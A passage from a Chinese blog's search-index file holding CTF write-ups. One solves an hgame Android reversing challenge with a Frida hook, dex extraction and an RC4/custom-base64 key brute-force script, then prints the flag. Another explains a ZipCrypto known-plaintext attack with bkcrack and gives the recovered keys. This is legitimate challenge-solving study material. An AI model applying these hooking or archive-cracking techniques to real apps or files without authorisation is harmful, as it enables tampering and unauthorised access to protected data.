class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-comment">// 获取 File 类</span><br>    <span class="hljs-keyword">var</span> <span class="hljs-title class_">File</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;java.io.File&quot;</span>);<br> <br>    <span class="hljs-comment">// 获取 DexCall 类</span><br>    <span class="hljs-keyword">var</span> <span class="hljs-title class_">DexCall</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;com.nobody.zunjia.DexCall&quot;</span>);<br> <br>    <span class="hljs-comment">// Hook copyDexFromAssets 方法</span><br>    <span class="hljs-title class_">DexCall</span>.<span class="hljs-property">copyDexFromAssets</span>.<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">context, dexFileName, dexDir</span>) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[*] copyDexFromAssets called with dexFileName: &quot;</span> + dexFileName);<br> <br>        <span class="hljs-comment">// 调用原始方法获取 dex 文件</span><br>        <span class="hljs-keyword">var</span> dexFile = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">copyDexFromAssets</span>(context, dexFileName, dexDir);<br> <br>        <span class="hljs-comment">// 获取 dex 文件的路径</span><br>        <span class="hljs-keyword">var</span> dexFilePath = dexFile.<span class="hljs-title function_">getAbsolutePath</span>();<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[*] dex file saved to: &quot;</span> + dexFilePath);<br> <br>        <span class="hljs-comment">// 获取目标路径以保存 dex 文件（例如 `/data/data/com.nobody.zunjia/files/dex_copy`）</span><br>        <span class="hljs-keyword">var</span> savePath = <span class="hljs-string">&quot;/data/user/0/com.nobody.zunjia/cache/dex/dex_copy&quot;</span>;<br>        <span class="hljs-keyword">var</span> targetFile = <span class="hljs-title class_">File</span>.$new(savePath);<br> <br>        <span class="hljs-comment">// 使用 Java IO API 来拷贝文件</span><br>        <span class="hljs-keyword">var</span> inputStream = dexFile.$new(dexFilePath).<span class="hljs-title function_">getInputStream</span>();<br>        <span class="hljs-keyword">var</span> outputStream = targetFile.<span class="hljs-title function_">getOutputStream</span>();<br> <br>        <span class="hljs-keyword">var</span> buffer = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">array</span>(<span class="hljs-string">&#x27;byte&#x27;</span>, [<span class="hljs-number">1024</span>]);<br>        <span class="hljs-keyword">var</span> bytesRead;<br> <br>        <span class="hljs-keyword">while</span> ((bytesRead = inputStream.<span class="hljs-title function_">read</span>(buffer)) !== -<span class="hljs-number">1</span>) &#123;<br>            outputStream.<span class="hljs-title function_">write</span>(buffer, <span class="hljs-number">0</span>, bytesRead);<br>        &#125;<br> <br>        <span class="hljs-comment">// 关闭流</span><br>        inputStream.<span class="hljs-title function_">close</span>();<br>        outputStream.<span class="hljs-title function_">close</span>();<br> <br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[*] dex file copied to: &quot;</span> + savePath);<br> <br>        <span class="hljs-comment">// 返回 dex 文件</span><br>        <span class="hljs-keyword">return</span> dexFile;<br>    &#125;;<br>&#125;);<br></code></pre></td></tr></table></figure><p><img src="/../images/2/zj7.png"><br>这个路径下没有权限不能直接进行提取，先把它转移到另外的文件夹，再用 adb pull 提取出来<br><img src="/../images/2/zj8.png"></p><p><img src="/../images/2/zj9.png"></p><p><img src="/../images/2/zj10.png"><br>可以看到这个路径下多了一个<code>zunjia.dex</code>文件，然后执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mv</span> zunjia.dex /sdcard/Download<br></code></pre></td></tr></table></figure><p><img src="/../images/2/zj11.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">adb pull /sdcard/Download/zunjia.dex D:\aaa\zunjia<br></code></pre></td></tr></table></figure><p><img src="/../images/2/zj12.png"><br>这样就把 dex 文件提取到本地了，然后在 jadx 中把这个文件也添加进去，可以看到多了的内容<br><img src="/../images/2/zj13.png"><br>base64换表</p><p>有个 toast 类，里面有一个 native 的check 函数<br><img src="/../images/2/zj14.png"></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-title function_">check</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">mycontext</span>, (<span class="hljs-title class_">String</span>) <span class="hljs-title class_">DexCall</span>.<span class="hljs-title function_">callDexMethod</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">mycontext</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">mycontext</span>.<span class="hljs-title function_">getString</span>(R.<span class="hljs-property">string</span>.<span class="hljs-property">dex</span>), <span class="hljs-variable language_">this</span>.<span class="hljs-property">mycontext</span>.<span class="hljs-title function_">getString</span>(R.<span class="hljs-property">string</span>.<span class="hljs-property">classname</span>), <span class="hljs-variable language_">this</span>.<span class="hljs-property">mycontext</span>.<span class="hljs-title function_">getString</span>(R.<span class="hljs-property">string</span>.<span class="hljs-property">func1</span>), s));<br></code></pre></td></tr></table></figure><p>在<code>resources.arsc</code>的 res&#x2F;values&#x2F;strings.xml 中可以看到对应的字符串<br><img src="/../images/2/zj15.png"><br>所以这个其实是</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">(<span class="hljs-title class_">String</span>) <span class="hljs-title class_">DexCall</span>.<span class="hljs-title function_">callDexMethod</span>(<span class="hljs-string">&quot;zunjia.dex&quot;</span>，<span class="hljs-string">&quot;com.nobody.zundujiadu&quot;</span>, <span class="hljs-string">&quot;encode&quot;</span>, s);<br></code></pre></td></tr></table></figure><p>分析 check.so 文件<br><img src="/../images/2/zj16.png"><br>获取密文数据，ida 脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> idaapi <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">43</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(get_bytes(<span class="hljs-number">0x3958</span> + i, <span class="hljs-number">1</span>)[<span class="hljs-number">0</span>]), end=<span class="hljs-string">&quot;,&quot;</span>) <br><br><span class="hljs-comment">#output:0x7a,0xc7,0xc7,0x94,0x51,0x82,0xf5,0x99,0xc,0x30,0xc8,0xcd,0x97,0xfe,0x3d,0xd2,0xae,0xe,0xba,0x83,0x59,0x87,0xbb,0xc6,0x35,0xe1,0x8c,0x59,0xef,0xad,0xfa,0x94,0x74,0xd3,0x42,0x27,0x98,0x77,0x54,0x3b,0x46,0x5e,0x95,</span><br></code></pre></td></tr></table></figure><p>加密函数点进去看是rc4</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> product<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4</span>(<span class="hljs-params">key, data</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;RC4算法实现&quot;&quot;&quot;</span><br>    S = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))<br>    j = <span class="hljs-number">0</span><br>    <span class="hljs-comment"># 密钥调度算法（KSA）</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        j = (j + S[i] + key[i % <span class="hljs-built_in">len</span>(key)]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br>    <span class="hljs-comment"># 伪随机生成算法（PRGA）</span><br>    i = j = <span class="hljs-number">0</span><br>    result = <span class="hljs-built_in">bytearray</span>()<br>    <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> data:<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>        j = (j + S[i]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br>        k = S[(S[i] + S[j]) % <span class="hljs-number">256</span>]<br>        result.append(byte ^ k &amp;<span class="hljs-number">0xff</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(result)<br> <br> <br><span class="hljs-comment"># 定义标准 Base64 字符表</span><br>standard_base64 = <span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&quot;</span><br> <br><span class="hljs-comment"># 定义自定义 Base64 字符表（换表）</span><br>custom_base64 = <span class="hljs-string">&quot;3GHIJKLMNOPQRSTUb=cdefghijklmnopWXYZ/12+406789VaqrstuvwxyzABCDEF5&quot;</span><br> <br><span class="hljs-comment"># 构建换表字典</span><br>encode_dict = &#123;standard_base64[i]: custom_base64[i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(standard_base64))&#125;<br> <br><span class="hljs-comment"># 简化的加密函数</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">custom_base64_encode</span>(<span class="hljs-params">data</span>):<br>    result = []<br>    <span class="hljs-comment"># 遍历字符串中的每个字符</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(data)):<br>        <span class="hljs-comment"># 将字符转换为 ASCII 值并与索引 i 进行异或</span><br>        result.append(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(data[i]) ^ i))<br>    <span class="hljs-comment"># 将结果列表转回字符串</span><br>    data = <span class="hljs-string">&#x27;&#x27;</span>.join(result)<br>    base64_encoded = base64.b64encode(data.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(encode_dict.get(c, c) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> base64_encoded)<br> <br> <br><span class="hljs-comment"># 密文数据</span><br>encrypted_data = <span class="hljs-built_in">bytes</span>([<br>    <span class="hljs-number">0x7a</span>, <span class="hljs-number">0xc7</span>, <span class="hljs-number">0xc7</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0xf5</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x0c</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0xc8</span>, <span class="hljs-number">0xcd</span>,<br>    <span class="hljs-number">0x97</span>, <span class="hljs-number">0xfe</span>, <span class="hljs-number">0x3d</span>, <span class="hljs-number">0xd2</span>, <span class="hljs-number">0xae</span>, <span class="hljs-number">0x0e</span>, <span class="hljs-number">0xba</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0xbb</span>, <span class="hljs-number">0xc6</span>,<br>    <span class="hljs-number">0x35</span>, <span class="hljs-number">0xe1</span>, <span class="hljs-number">0x8c</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0xef</span>, <span class="hljs-number">0xad</span>, <span class="hljs-number">0xfa</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0xd3</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x27</span>,<br>    <span class="hljs-number">0x98</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x3b</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x5e</span>, <span class="hljs-number">0x95</span><br>])<br> <br><span class="hljs-comment"># 生成所有可能的密码组合</span><br>segments = [<span class="hljs-string">&#x27;o.0&#x27;</span>, <span class="hljs-string">&#x27;0.o&#x27;</span>]<br> <br><span class="hljs-keyword">for</span> bits <span class="hljs-keyword">in</span> product([<span class="hljs-number">0</span>, <span class="hljs-number">1</span>], repeat=<span class="hljs-number">12</span>):<br>    <span class="hljs-comment"># 构造密码</span><br>    password = <span class="hljs-string">&#x27;&#x27;</span>.join([segments[b] <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> bits])<br> <br>    <span class="hljs-comment"># 转换到标准Base64</span><br>    key=custom_base64_encode(password).encode()<br>    <span class="hljs-comment"># 使用密钥解密</span><br>    decrypted = rc4(key, encrypted_data)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;hgame&#x27;</span> <span class="hljs-keyword">in</span> decrypted:<br>        <span class="hljs-built_in">print</span>(decrypted)<br></code></pre></td></tr></table></figure><blockquote><p>b’hgame{4af153b9-ed3e-420b-978c-eeff72318b49}’</p></blockquote><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Reverse</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>明文攻击</title>
    <link href="/2025/02/20/mingatk/"/>
    <url>/2025/02/20/mingatk/</url>
    
    <content type="html"><![CDATA[<h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>没有通常会给的已知文件，只给了一个压缩包，里面是被加密的一张png图片</p><h4 id="了解一下-明文攻击"><a href="#了解一下-明文攻击" class="headerlink" title="了解一下 明文攻击"></a>了解一下 <code>明文攻击</code></h4><p> 符合哪些特征可以使用明文攻击</p><ol><li>Zip文件</li><li>文件均为ZipCrypto加密</li><li>已知加密文件的部分明文（至少连续的8字节&#x2F;12字节）</li></ol><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><ol><li>获取png文件头,得到png_hearder文件</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 十六进制字符串</span><br>hex_string = <span class="hljs-string">&quot;89504E470D0A1A0A0000000D49484452&quot;</span><br><br><span class="hljs-comment"># 将十六进制字符串转换为字节数据</span><br>binary_data = <span class="hljs-built_in">bytes</span>.fromhex(hex_string)<br><br><span class="hljs-comment"># 将字节数据写入文件</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;png_header&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(binary_data)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;文件 &#x27;png_header&#x27; 已成功创建！&quot;</span>)<br></code></pre></td></tr></table></figure><ol start="2"><li>使用工具<code>bkcrack</code>得到密钥</li></ol><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">PS D:\CTF\tool\bkcrack&gt; .\bkcrack<span class="hljs-selector-class">.exe</span> -C bkcrack_advanced<span class="hljs-selector-class">.zip</span> -c <span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.png</span> -<span class="hljs-selector-tag">p</span> png_header<br></code></pre></td></tr></table></figure><p><strong>Keys</strong>: b53dcc5c 19c8786e f0298d20</p><ol start="3"><li>利用密钥破解文件</li></ol><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">PS D:\CTF\tool\<span class="hljs-keyword">bkcrack&gt; </span>.\<span class="hljs-keyword">bkcrack.exe </span>-C <span class="hljs-keyword">bkcrack_advanced.zip </span>-c a.png -k <span class="hljs-keyword">b53dcc5c </span><span class="hljs-number">19</span>c8786e f0298d20 -d <span class="hljs-number">1</span>.png<br></code></pre></td></tr></table></figure><p>得到解密后的文件<code>1.png</code></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Misc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2025/02/18/hello-world/"/>
    <url>/2025/02/18/hello-world/</url>
    
    <content type="html"><![CDATA[<p><em>Welcome to my blog.</em><br><em>I’m  <strong>Eleven</strong>.</em><br><em>So nice to meet you.</em></p><hr><p> <strong>“And it’s fine to fake it ‘til you make it</strong><br> <strong>‘Til you do,’til it’s true.”</strong></p><p><em><strong>It’s better to burn out than to fade away.</strong></em></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
